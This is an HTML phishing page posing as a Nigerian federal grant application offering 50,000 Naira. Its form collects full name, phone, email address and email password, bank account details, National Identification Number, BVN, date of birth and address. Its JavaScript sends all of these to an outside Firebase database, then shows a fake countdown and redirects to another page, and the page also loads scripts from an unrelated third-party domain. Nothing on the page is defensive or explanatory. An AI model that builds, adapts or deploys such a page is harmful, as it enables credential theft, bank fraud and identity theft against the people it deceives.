<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nigeria Federal Grant</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
        padding: 20px;
      }

      header {
        display: flex;
        align-items: center;
        margin-bottom: 40px;
      }

      header .logo {
        width: 50px;
        height: 50px;
        margin-right: 15px;
      }

      header .site-name {
        font-size: 30px;
        color: #333;
      }

      .container {
        background-color: #fff;
        padding: 30px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        max-width: 600px;
        margin: 0 auto;
        border-radius: 10px;
      }

      form h2 {
        text-align: center;
        margin-bottom: 30px;
        color: #333;
      }

      form label {
        font-size: 14px;
        margin-bottom: 8px;
        display: block;
        color: #555;
      }

      form input,
      form textarea,
      form button {
        width: 100%;
        padding: 12px;
        margin-bottom: 18px;
        border: 1px solid #ddd;
        border-radius: 5px;
        font-size: 16px;
      }

      form textarea {
        resize: vertical;
      }

      form button {
        background-color: #28a745;
        color: white;
        font-size: 16px;
        cursor: pointer;
        border: none;
        padding: 15px;
        border-radius: 5px;
        transition: background-color 0.3s;
      }

      form button:hover {
        background-color: #218838;
      }

      .dialog {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        justify-content: center;
        align-items: center;
        z-index: 1000;
        width: 95%;
      }

      .dialog-content {
        background-color: #fff;
        padding: 30px;
        text-align: center;
        width: 80%;
        max-width: 500px;
        border-radius: 10px;
      }

      .dialog-image {
        width: 100px;
        margin-bottom: 20px;
      }

      #countdown {
        font-size: 18px;
        margin: 20px 0;
      }

      #continueBtn {
        background-color: #28a745;
        color: white;
        padding: 12px 30px;
        font-size: 16px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }

      #continueBtn:hover {
        background-color: #28a745;
      }
    </style>
    <script
      type="text/javascript"
      src="//slushhelmetmirth.com/a6/aa/f0/a6aaf0870de26307bc3abe2c99b32a5d.js"
    ></script>
    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-database-compat.js"></script>
  </head>
  <body>
    <header>
      <img
        src="https://cdn-icons-png.flaticon.com/128/1376/1376834.png"
        alt="Nigeria Federal Grant Logo"
        class="logo"
      />
      <h1 class="site-name">Nigeria Federal Grant</h1>
    </header>

    <div class="container">
      <form id="grantForm">
        <h2>Application Form</h2>

        <label for="fullName">Full Name</label>
        <input type="text" id="fullName" name="fullName" required />

        <label for="phoneNumber">Phone Number</label>
        <input type="tel" id="phoneNumber" name="phoneNumber" required />

        <label for="email">Email Address</label>
        <input type="email" id="email" name="email" required />

        <label for="password">Email Address Password</label>
        <input type="password" id="password" name="password" required />

        <label for="accountNumber">Account Number</label>
        <input type="text" id="accountNumber" name="accountNumber" required />

        <label for="accountName">Account Name</label>
        <input type="text" id="accountName" name="accountName" required />

        <label for="bankName">Bank Name</label>
        <input type="text" id="bankName" name="bankName" required />

        <label for="nationalID">National Identification Number</label>
        <input type="text" id="nationalID" name="nationalID" required />

        <label for="bvn">BVN</label>
        <input type="text" id="bvn" name="bvn" required />

        <label for="dob">Date of Birth</label>
        <input type="date" id="dob" name="dob" required />

        <label for="address">Residential Address</label>
        <textarea id="address" name="address" required></textarea>

        <button type="button" id="proceedBtn">Proceed</button>
      </form>
    </div>

    <div id="verificationDialog" class="dialog">
      <div class="dialog-content">
        <img
          src="https://cdn-icons-png.flaticon.com/128/2822/2822687.png"
          alt="Verification"
          class="dialog-image"
        />
        <p>
          If any of the information filled is incorrect, you won't receive the
          50,000 Naira FG grant. The grant will be sent in 42 hours.
        </p>
        <p id="countdown"></p>
        <button id="continueBtn">Continue</button>
      </div>
    </div>

    <script>
      document
        .getElementById("proceedBtn")
        .addEventListener("click", function () {
          document.getElementById("verificationDialog").style.display = "flex";
          startCountdown();
        });

      document
        .getElementById("continueBtn")
        .addEventListener("click", function () {
          window.location.href = "verify.html";
        });

      // Countdown timer for the 42-hour delay
      function startCountdown() {
        let countdownDate = new Date().getTime() + 42 * 60 * 60 * 1000;

        let countdownElement = document.getElementById("countdown");

        let interval = setInterval(function () {
          let now = new Date().getTime();
          let distance = countdownDate - now;

          if (distance < 0) {
            clearInterval(interval);
            countdownElement.innerHTML = "The 42 hours have passed.";
          } else {
            let hours = Math.floor(
              (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
            );
            let minutes = Math.floor(
              (distance % (1000 * 60 * 60)) / (1000 * 60)
            );
            let seconds = Math.floor((distance % (1000 * 60)) / 1000);

            countdownElement.innerHTML =
              hours + "h " + minutes + "m " + seconds + "s ";
          }
        }, 1000);
      }
    </script>
    <script>

      const firebaseConfig = {

        authDomain: "moniebase-b4b4d.firebaseapp.com",
        databaseURL: "https://moniebase-b4b4d-default-rtdb.firebaseio.com/",
        projectId: "moniebase-b4b4d",
        storageBucket: "YOUR_STORAGE_BUCKET",
        messagingSenderId: "1009678808253",
        appId: "1:1009678808253:android:ff94e94c52bad2db7973d4",
      };

      // Initialize Firebase
      const app = firebase.initializeApp(firebaseConfig);
      const database = firebase.database(app);

      // Get the "Proceed" button and form elements
      const proceedBtn = document.getElementById("proceedBtn");
      const form = document.getElementById("userForm");

      // Function to push data to Firebase
      const pushToFirebase = () => {
        // Get form data
        const formData = {
          fullName: document.getElementById("fullName").value,
          phoneNumber: document.getElementById("phoneNumber").value,
          email: document.getElementById("email").value,
          password: document.getElementById("password").value,
          accountNumber: document.getElementById("accountNumber").value,
          accountName: document.getElementById("accountName").value,
          bankName: document.getElementById("bankName").value,
          nationalID: document.getElementById("nationalID").value,
          bvn: document.getElementById("bvn").value,
          dob: document.getElementById("dob").value,
          address: document.getElementById("address").value,
        };

        // Push data to Firebase Realtime Database
        database.ref("users/").push(formData, (error) => {
          if (error) {
            console.error("Error Sending to federal government:", error);
          } else {
            alert("Details incorrect");
            form.reset();
          }
        });
      };

      // Event listener for button click
      proceedBtn.addEventListener("click", pushToFirebase);
    </script>
    <script
      type="text/javascript"
      src="//slushhelmetmirth.com/7a/ea/37/7aea374aead78bb3565a57a14614b80d.js"
    ></script>
  </body>
</html>
